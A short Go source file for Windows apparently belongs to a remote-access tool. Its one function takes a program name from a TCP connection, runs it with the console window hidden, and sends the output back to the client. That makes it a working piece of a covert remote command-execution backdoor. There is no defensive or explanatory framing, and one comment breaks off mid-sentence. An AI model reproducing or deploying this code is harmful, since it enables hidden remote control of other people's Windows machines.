// +build windows

package stream

import (
	"net"
	"os/exec"
	"syscall"
)

// ExecProgram for TCP Listener...client sends program
// it wants to execute on listener.  Listener waits for
func ExecProgram(conn net.Conn, program string) {

	// Windows command execute
	cmd := exec.Command(program)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} // Comment to unhide
	out, _ := cmd.Output()
	conn.Write([]byte(out))

}
